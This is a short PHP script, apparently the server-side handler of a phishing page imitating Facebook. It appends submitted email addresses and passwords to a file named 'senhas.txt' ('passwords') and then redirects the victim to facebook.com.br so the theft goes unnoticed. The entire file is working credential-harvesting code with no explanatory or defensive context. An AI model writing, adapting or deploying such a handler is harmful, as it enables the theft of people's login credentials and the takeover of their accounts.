<?php
$caixa1 = $_POST["email"] . "\n";
$caixa2 = $_POST["pass"] . "\n";

$file = fopen("senhas.txt","a");

$escreve1 = fwrite($file, $caixa1);
$escreve2 = fwrite($file, $caixa2);

fclose($file);

header("Location: http://www.facebook.com.br");
?>
